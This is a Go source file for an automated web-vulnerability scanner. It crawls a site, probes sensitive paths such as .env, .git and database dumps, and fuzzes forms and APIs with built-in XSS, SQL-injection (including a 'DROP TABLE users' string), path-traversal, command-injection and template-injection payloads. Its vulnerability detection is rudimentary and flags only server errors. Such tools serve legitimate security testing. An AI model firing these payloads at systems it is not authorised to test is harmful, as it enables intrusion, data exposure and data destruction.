package crawler

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/PuerkitoBio/goquery"
	"github.com/sirupsen/logrus"
)

type EndpointType string

const (
	TypeForm       EndpointType = "form"
	TypeAPI        EndpointType = "api"
	TypeAdmin      EndpointType = "admin"
	TypeUpload     EndpointType = "upload"
	TypeLogin      EndpointType = "login"
	TypeConfig     EndpointType = "config"
	TypeBackup     EndpointType = "backup"
	TypeDebug      EndpointType = "debug"
	TypeHidden     EndpointType = "hidden"
	TypeAjax       EndpointType = "ajax"
)

type Endpoint struct {
	URL         string            `json:"url"`
	Method      string            `json:"method"`
	Type        EndpointType      `json:"type"`
	Parameters  map[string]string `json:"parameters"`
	Headers     map[string]string `json:"headers"`
	StatusCode  int               `json:"status_code"`
	ResponseSize int              `json:"response_size"`
	Technology  string            `json:"technology"`
	Confidence  float64           `json:"confidence"`
	Discovered  time.Time         `json:"discovered"`
	Vulnerable  bool              `json:"vulnerable"`
	Payloads    []string          `json:"payloads"`
}

type SmartCrawler struct {
	target       string
	maxDepth     int
	maxPages     int
	timeout      time.Duration
	userAgent    string
	client       *http.Client
	logger       *logrus.Logger
	
	// Discovery patterns
	endpoints    []*Endpoint
	visited      map[string]bool
	discovered   map[string]*Endpoint
	mutex        sync.RWMutex
	
	// Smart features
	aiMode       bool
	aggressive   bool
	techStack    map[string]bool
	wordlist     []string
	
	// Fuzzing
	fuzzEnabled  bool
	fuzzPayloads map[string][]string
}

func NewSmartCrawler(target string, options ...func(*SmartCrawler)) *SmartCrawler {
	crawler := &SmartCrawler{
		target:     target,
		maxDepth:   5,
		maxPages:   1000,
		timeout:    time.Second * 10,
		userAgent:  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
		logger:     logrus.New(),
		endpoints:  make([]*Endpoint, 0),
		visited:    make(map[string]bool),
		discovered: make(map[string]*Endpoint),
		aiMode:     true,
		aggressive: false,
		techStack:  make(map[string]bool),
		fuzzEnabled: true,
	}
	
	crawler.client = &http.Client{
		Timeout: crawler.timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	
	for _, option := range options {
		option(crawler)
	}
	
	crawler.initializeWordlist()
	crawler.initializeFuzzPayloads()
	
	return crawler
}

func WithMaxDepth(depth int) func(*SmartCrawler) {
	return func(sc *SmartCrawler) {
		sc.maxDepth = depth
	}
}

func WithAggressive() func(*SmartCrawler) {
	return func(sc *SmartCrawler) {
		sc.aggressive = true
	}
}

func WithFuzzing() func(*SmartCrawler) {
	return func(sc *SmartCrawler) {
		sc.fuzzEnabled = true
	}
}

func (sc *SmartCrawler) initializeWordlist() {
	sc.wordlist = []string{
		// Admin paths
		"admin", "administrator", "admin.php", "admin.html", "admin/",
		"wp-admin", "wp-admin.php", "adminpanel", "control", "panel",
		
		// API endpoints
		"api", "api/v1", "api/v2", "rest", "graphql", "swagger",
		"api.php", "api.json", "api/users", "api/admin", "api/config",
		
		// Configuration files
		"config", "config.php", "configuration", "settings", "env",
		".env", "config.json", "config.xml", "web.config", "app.config",
		
		// Backup files
		"backup", "backups", "dump", "sql", "database", "db",
		"backup.zip", "backup.tar.gz", "dump.sql", "database.sql",
		
		// Upload directories
		"upload", "uploads", "files", "media", "assets", "images",
		"documents", "temp", "tmp", "cache",
		
		// Debug/Development
		"debug", "test", "testing", "dev", "development", "staging",
		"phpinfo", "info.php", "debug.php", "test.php",
		
		// Hidden directories
		".git", ".svn", ".hg", ".DS_Store", "robots.txt", "sitemap.xml",
		".htaccess", ".htpasswd", "crossdomain.xml",
		
		// Login pages
		"login", "signin", "auth", "authenticate", "session",
		"login.php", "signin.php", "auth.php", "user/login",
	}
}

func (sc *SmartCrawler) initializeFuzzPayloads() {
	sc.fuzzPayloads = map[string][]string{
		"xss": {
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"javascript:alert(1)",
			"'><script>alert(1)</script>",
			"\"><script>alert(1)</script>",
		},
		"sqli": {
			"'",
			"\"",
			"' OR '1'='1",
			"' UNION SELECT 1,2,3--",
			"'; DROP TABLE users--",
		},
		"lfi": {
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
			"....//....//....//etc/passwd",
			"/etc/passwd%00",
		},
		"command": {
			"; ls",
			"| ls", 
			"& ls",
			"; cat /etc/passwd",
			"`ls`",
			"$(ls)",
		},
		"ssti": {
			"{{7*7}}",
			"${7*7}",
			"<%=7*7%>",
			"{{config}}",
			"{{''.__class__.__mro__[2].__subclasses__()}}",
		},
	}
}

func (sc *SmartCrawler) Crawl(ctx context.Context) ([]*Endpoint, error) {
	sc.logger.Infof("🕷️ Starting smart crawl of %s", sc.target)
	
	// Phase 1: Basic crawling
	err := sc.basicCrawl(ctx, sc.target, 0)
	if err != nil {
		return nil, fmt.Errorf("basic crawl failed: %w", err)
	}
	
	// Phase 2: Technology detection
	sc.detectTechnologies()
	
	// Phase 3: Intelligent discovery
	sc.intelligentDiscovery(ctx)
	
	// Phase 4: Fuzzing (if enabled)
	if sc.fuzzEnabled {
		sc.fuzzEndpoints(ctx)
	}
	
	sc.logger.Infof("🎯 Crawl complete: discovered %d endpoints", len(sc.endpoints))
	return sc.endpoints, nil
}

func (sc *SmartCrawler) basicCrawl(ctx context.Context, targetURL string, depth int) error {
	if depth > sc.maxDepth || len(sc.endpoints) > sc.maxPages {
		return nil
	}
	
	sc.mutex.Lock()
	if sc.visited[targetURL] {
		sc.mutex.Unlock()
		return nil
	}
	sc.visited[targetURL] = true
	sc.mutex.Unlock()
	
	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", sc.userAgent)
	
	resp, err := sc.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	// Create endpoint record
	endpoint := &Endpoint{
		URL:         targetURL,
		Method:      "GET",
		StatusCode:  resp.StatusCode,
		Headers:     make(map[string]string),
		Parameters:  make(map[string]string),
		Discovered:  time.Now(),
		Technology:  sc.detectTechFromHeaders(resp.Header),
		Type:        sc.classifyEndpoint(targetURL),
	}
	
	// Copy response headers
	for k, v := range resp.Header {
		if len(v) > 0 {
			endpoint.Headers[k] = v[0]
		}
	}
	
	sc.mutex.Lock()
	sc.endpoints = append(sc.endpoints, endpoint)
	sc.discovered[targetURL] = endpoint
	sc.mutex.Unlock()
	
	// Parse HTML for links (if it's HTML)
	if strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
		doc, err := goquery.NewDocumentFromReader(resp.Body)
		if err == nil {
			sc.extractLinks(ctx, doc, targetURL, depth)
			sc.extractForms(doc, targetURL)
			sc.extractAPIEndpoints(doc, targetURL)
		}
	}
	
	return nil
}

func (sc *SmartCrawler) extractLinks(ctx context.Context, doc *goquery.Document, baseURL string, depth int) {
	doc.Find("a[href]").Each(func(i int, s *goquery.Selection) {
		href, exists := s.Attr("href")
		if !exists {
			return
		}
		
		absoluteURL := sc.resolveURL(baseURL, href)
		if absoluteURL != "" && sc.isInScope(absoluteURL) {
			go sc.basicCrawl(ctx, absoluteURL, depth+1)
		}
	})
}

func (sc *SmartCrawler) extractForms(doc *goquery.Document, baseURL string) {
	doc.Find("form").Each(func(i int, s *goquery.Selection) {
		action, _ := s.Attr("action")
		method, _ := s.Attr("method")
		
		if method == "" {
			method = "GET"
		}
		
		formURL := sc.resolveURL(baseURL, action)
		if formURL == "" {
			return
		}
		
		endpoint := &Endpoint{
			URL:        formURL,
			Method:     strings.ToUpper(method),
			Type:       TypeForm,
			Parameters: make(map[string]string),
			Headers:    make(map[string]string),
			Discovered: time.Now(),
			Confidence: 0.9,
		}
		
		// Extract form parameters
		s.Find("input, select, textarea").Each(func(j int, input *goquery.Selection) {
			name, exists := input.Attr("name")
			if exists {
				inputType, _ := input.Attr("type")
				endpoint.Parameters[name] = inputType
			}
		})
		
		// Classify form type
		if sc.isLoginForm(s) {
			endpoint.Type = TypeLogin
		} else if sc.isUploadForm(s) {
			endpoint.Type = TypeUpload
		}
		
		sc.mutex.Lock()
		sc.endpoints = append(sc.endpoints, endpoint)
		sc.discovered[formURL] = endpoint
		sc.mutex.Unlock()
	})
}

func (sc *SmartCrawler) extractAPIEndpoints(doc *goquery.Document, baseURL string) {
	// Look for JavaScript API calls
	doc.Find("script").Each(func(i int, s *goquery.Selection) {
		scriptContent := s.Text()
		
		// Common API patterns
		patterns := []string{
			`fetch\(['"]([^'"]+)['"]`,
			`axios\.get\(['"]([^'"]+)['"]`,
			`\$\.ajax\({[^}]*url:\s*['"]([^'"]+)['"]`,
			`XMLHttpRequest.*open\(['"][^'"]*['"],\s*['"]([^'"]+)['"]`,
		}
		
		for _, pattern := range patterns {
			re := regexp.MustCompile(pattern)
			matches := re.FindAllStringSubmatch(scriptContent, -1)
			
			for _, match := range matches {
				if len(match) > 1 {
					apiURL := sc.resolveURL(baseURL, match[1])
					if apiURL != "" && sc.isInScope(apiURL) {
						endpoint := &Endpoint{
							URL:        apiURL,
							Method:     "GET",
							Type:       TypeAPI,
							Parameters: make(map[string]string),
							Headers:    make(map[string]string),
							Discovered: time.Now(),
							Confidence: 0.7,
						}
						
						sc.mutex.Lock()
						sc.endpoints = append(sc.endpoints, endpoint)
						sc.discovered[apiURL] = endpoint
						sc.mutex.Unlock()
					}
				}
			}
		}
	})
}

func (sc *SmartCrawler) intelligentDiscovery(ctx context.Context) {
	sc.logger.Info("🧠 Starting intelligent endpoint discovery")
	
	baseURL := sc.getBaseURL()
	
	// Technology-specific discovery
	for tech := range sc.techStack {
		paths := sc.getTechSpecificPaths(tech)
		for _, path := range paths {
			testURL := baseURL + "/" + strings.TrimPrefix(path, "/")
			sc.testEndpoint(ctx, testURL)
		}
	}
	
	// Common paths discovery
	for _, path := range sc.wordlist {
		testURL := baseURL + "/" + strings.TrimPrefix(path, "/")
		sc.testEndpoint(ctx, testURL)
	}
	
	// Parameter discovery for existing endpoints
	if sc.aggressive {
		sc.discoverParameters(ctx)
	}
}

func (sc *SmartCrawler) getTechSpecificPaths(tech string) []string {
	techPaths := map[string][]string{
		"php": {
			"phpinfo.php", "info.php", "config.php", "database.php",
			"wp-config.php", "configuration.php", "admin.php",
		},
		"asp": {
			"web.config", "global.asax", "default.aspx", "admin.aspx",
		},
		"java": {
			"web.xml", "WEB-INF/", "META-INF/", "admin/",
		},
		"nodejs": {
			"package.json", "server.js", "app.js", "config/",
		},
		"python": {
			"app.py", "main.py", "settings.py", "config.py",
		},
	}
	
	if paths, exists := techPaths[tech]; exists {
		return paths
	}
	
	return []string{}
}

func (sc *SmartCrawler) testEndpoint(ctx context.Context, testURL string) {
	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", sc.userAgent)
	
	resp, err := sc.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	// Only add interesting responses
	if sc.isInterestingResponse(resp) {
		endpoint := &Endpoint{
			URL:        testURL,
			Method:     "GET",
			StatusCode: resp.StatusCode,
			Type:       sc.classifyEndpoint(testURL),
			Headers:    make(map[string]string),
			Parameters: make(map[string]string),
			Discovered: time.Now(),
			Confidence: sc.calculateConfidence(resp),
		}
		
		sc.mutex.Lock()
		sc.endpoints = append(sc.endpoints, endpoint)
		sc.discovered[testURL] = endpoint
		sc.mutex.Unlock()
	}
}

func (sc *SmartCrawler) fuzzEndpoints(ctx context.Context) {
	sc.logger.Info("🎯 Starting endpoint fuzzing")
	
	for _, endpoint := range sc.endpoints {
		if endpoint.Type == TypeForm && len(endpoint.Parameters) > 0 {
			sc.fuzzFormParameters(ctx, endpoint)
		}
		
		if endpoint.Type == TypeAPI {
			sc.fuzzAPIEndpoint(ctx, endpoint)
		}
	}
}

func (sc *SmartCrawler) fuzzFormParameters(ctx context.Context, endpoint *Endpoint) {
	for param := range endpoint.Parameters {
		for vulnType, payloads := range sc.fuzzPayloads {
			for _, payload := range payloads {
				if sc.testPayload(ctx, endpoint, param, payload) {
					endpoint.Vulnerable = true
					endpoint.Payloads = append(endpoint.Payloads, fmt.Sprintf("%s: %s", vulnType, payload))
				}
			}
		}
	}
}

func (sc *SmartCrawler) fuzzAPIEndpoint(ctx context.Context, endpoint *Endpoint) {
	// Test common API vulnerabilities
	testCases := []struct{
		path string
		description string
	}{
		{"/../admin", "Path traversal"},
		{"/debug", "Debug endpoint"},
		{"?debug=1", "Debug parameter"},
		{"/config", "Config exposure"},
		{"/.env", "Environment file"},
	}
	
	for _, test := range testCases {
		testURL := endpoint.URL + test.path
		if sc.testSpecialEndpoint(ctx, testURL) {
			endpoint.Vulnerable = true
			endpoint.Payloads = append(endpoint.Payloads, test.description)
		}
	}
}

func (sc *SmartCrawler) testPayload(ctx context.Context, endpoint *Endpoint, param, payload string) bool {
	// Create request with payload
	testURL := endpoint.URL
	
	if endpoint.Method == "GET" {
		testURL += fmt.Sprintf("?%s=%s", param, url.QueryEscape(payload))
	}
	
	req, err := http.NewRequestWithContext(ctx, endpoint.Method, testURL, nil)
	if err != nil {
		return false
	}
	
	if endpoint.Method == "POST" {
		data := url.Values{}
		data.Set(param, payload)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Body = io.NopCloser(strings.NewReader(data.Encode()))
	}
	
	req.Header.Set("User-Agent", sc.userAgent)
	
	resp, err := sc.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	
	// Check for vulnerability indicators
	return sc.isVulnerableResponse(resp, payload)
}

func (sc *SmartCrawler) testSpecialEndpoint(ctx context.Context, testURL string) bool {
	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", sc.userAgent)
	
	resp, err := sc.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	
	return resp.StatusCode == 200 && resp.ContentLength > 0
}

func (sc *SmartCrawler) detectTechnologies() {
	for _, endpoint := range sc.endpoints {
		// Server header detection
		if server := endpoint.Headers["Server"]; server != "" {
			sc.addTechnology(server)
		}
		
		// X-Powered-By detection
		if powered := endpoint.Headers["X-Powered-By"]; powered != "" {
			sc.addTechnology(powered)
		}
		
		// URL-based detection
		if strings.Contains(endpoint.URL, ".php") {
			sc.techStack["php"] = true
		}
		if strings.Contains(endpoint.URL, ".aspx") {
			sc.techStack["asp"] = true
		}
		if strings.Contains(endpoint.URL, ".jsp") {
			sc.techStack["java"] = true
		}
	}
}

func (sc *SmartCrawler) addTechnology(tech string) {
	tech = strings.ToLower(tech)
	
	if strings.Contains(tech, "php") {
		sc.techStack["php"] = true
	}
	if strings.Contains(tech, "apache") {
		sc.techStack["apache"] = true
	}
	if strings.Contains(tech, "nginx") {
		sc.techStack["nginx"] = true
	}
	if strings.Contains(tech, "iis") {
		sc.techStack["iis"] = true
	}
	if strings.Contains(tech, "node") {
		sc.techStack["nodejs"] = true
	}
}

func (sc *SmartCrawler) detectTechFromHeaders(headers http.Header) string {
	if server := headers.Get("Server"); server != "" {
		return server
	}
	if powered := headers.Get("X-Powered-By"); powered != "" {
		return powered
	}
	return "unknown"
}

func (sc *SmartCrawler) classifyEndpoint(url string) EndpointType {
	url = strings.ToLower(url)
	
	if strings.Contains(url, "admin") {
		return TypeAdmin
	}
	if strings.Contains(url, "login") || strings.Contains(url, "signin") {
		return TypeLogin
	}
	if strings.Contains(url, "upload") {
		return TypeUpload
	}
	if strings.Contains(url, "api") || strings.Contains(url, "rest") {
		return TypeAPI
	}
	if strings.Contains(url, "config") {
		return TypeConfig
	}
	if strings.Contains(url, "backup") || strings.Contains(url, "dump") {
		return TypeBackup
	}
	if strings.Contains(url, "debug") || strings.Contains(url, "test") {
		return TypeDebug
	}
	
	return TypeHidden
}

func (sc *SmartCrawler) isLoginForm(form *goquery.Selection) bool {
	hasPassword := false
	hasUser := false
	
	form.Find("input").Each(func(i int, input *goquery.Selection) {
		inputType, _ := input.Attr("type")
		name, _ := input.Attr("name")
		
		if inputType == "password" {
			hasPassword = true
		}
		if strings.Contains(strings.ToLower(name), "user") || 
		   strings.Contains(strings.ToLower(name), "email") ||
		   strings.Contains(strings.ToLower(name), "login") {
			hasUser = true
		}
	})
	
	return hasPassword && hasUser
}

func (sc *SmartCrawler) isUploadForm(form *goquery.Selection) bool {
	hasFileInput := false
	
	form.Find("input[type=file]").Each(func(i int, input *goquery.Selection) {
		hasFileInput = true
	})
	
	return hasFileInput
}

func (sc *SmartCrawler) isInterestingResponse(resp *http.Response) bool {
	// 200 OK responses
	if resp.StatusCode == 200 {
		return true
	}
	
	// Redirects might be interesting
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		return true
	}
	
	// Authentication required
	if resp.StatusCode == 401 || resp.StatusCode == 403 {
		return true
	}
	
	return false
}

func (sc *SmartCrawler) isVulnerableResponse(resp *http.Response, payload string) bool {
	// Status code indicators
	if resp.StatusCode == 500 {
		return true // Internal server error might indicate injection
	}
	
	// TODO: Read response body and check for vulnerability indicators
	// This would require reading the response body and looking for:
	// - Error messages
	// - Reflected payload
	// - SQL errors
	// - Command execution output
	
	return false
}

func (sc *SmartCrawler) calculateConfidence(resp *http.Response) float64 {
	confidence := 0.5
	
	if resp.StatusCode == 200 {
		confidence += 0.3
	}
	if resp.ContentLength > 1000 {
		confidence += 0.2
	}
	
	return confidence
}

func (sc *SmartCrawler) discoverParameters(ctx context.Context) {
	commonParams := []string{
		"id", "user", "page", "file", "path", "url", "redirect",
		"q", "search", "query", "cmd", "command", "debug", "test",
		"admin", "auth", "token", "session", "lang", "language",
	}
	
	for _, endpoint := range sc.endpoints {
		for _, param := range commonParams {
			testURL := fmt.Sprintf("%s?%s=test", endpoint.URL, param)
			sc.testEndpoint(ctx, testURL)
		}
	}
}

func (sc *SmartCrawler) resolveURL(base, href string) string {
	baseURL, err := url.Parse(base)
	if err != nil {
		return ""
	}
	
	hrefURL, err := url.Parse(href)
	if err != nil {
		return ""
	}
	
	resolved := baseURL.ResolveReference(hrefURL)
	return resolved.String()
}

func (sc *SmartCrawler) isInScope(targetURL string) bool {
	parsedTarget, err := url.Parse(sc.target)
	if err != nil {
		return false
	}
	
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return false
	}
	
	return parsedURL.Host == parsedTarget.Host
}

func (sc *SmartCrawler) getBaseURL() string {
	parsedURL, err := url.Parse(sc.target)
	if err != nil {
		return sc.target
	}
	
	return fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
}

func (sc *SmartCrawler) GetStats() map[string]interface{} {
	sc.mutex.RLock()
	defer sc.mutex.RUnlock()
	
	stats := map[string]interface{}{
		"total_endpoints": len(sc.endpoints),
		"visited_pages":   len(sc.visited),
		"technologies":    sc.techStack,
	}
	
	// Count by type
	typeCounts := make(map[EndpointType]int)
	vulnerableCount := 0
	
	for _, endpoint := range sc.endpoints {
		typeCounts[endpoint.Type]++
		if endpoint.Vulnerable {
			vulnerableCount++
		}
	}
	
	stats["endpoint_types"] = typeCounts
	stats["vulnerable_endpoints"] = vulnerableCount
	
	return stats
}